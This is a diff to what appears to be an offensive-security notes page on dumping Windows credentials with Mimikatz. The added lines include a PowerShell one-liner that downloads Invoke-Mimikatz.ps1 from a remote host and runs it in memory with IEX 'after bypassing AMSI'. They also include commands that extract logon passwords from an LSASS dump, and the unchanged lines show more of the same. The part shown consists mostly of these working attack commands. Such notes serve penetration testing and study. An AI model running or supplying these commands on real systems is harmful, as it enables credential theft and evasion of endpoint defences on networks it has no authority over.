@@ -85,7 +85,7 @@ To dump TGT and TGS:
 ```
 (If you want to be stealthier, you can use [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)).
 
-2nd method(using [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1)):
+2nd method(using [Invoke-Mimikatz](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1))((after bypassing AMSI)):
 
 ```
 1. PS C:\Windows\system32> (New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/Invoke-Mimikatz.ps1') | IEX
@@ -107,6 +107,10 @@ C:\minidump.exe c:\windows\tasks\lsass.dmp
 #From a mimikatz shell(note that this doesn't require debug privileges)
 1. sekurlsa::minidump lsass.dmp
 2. sekurlsa::logonpasswords
+
+#Invoking mimikatz through reflection(after bypassing AMSI)
+1. PS C:\> (New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/Invoke-Mimikatz.ps1') | IEX
+2. PS C:\> Invoke-Mimikatz -Command "`"sekurlsa::minidump c:\tools\lsass.dmp`"sekurlsa::logonpasswords"
 ```
 
 When the popularity of cached credential retrieving raised, Microsoft introduced 2 secuirty measures: LSA Protection and Windows Defender Credential Guard. The LSA protection added an additional process 
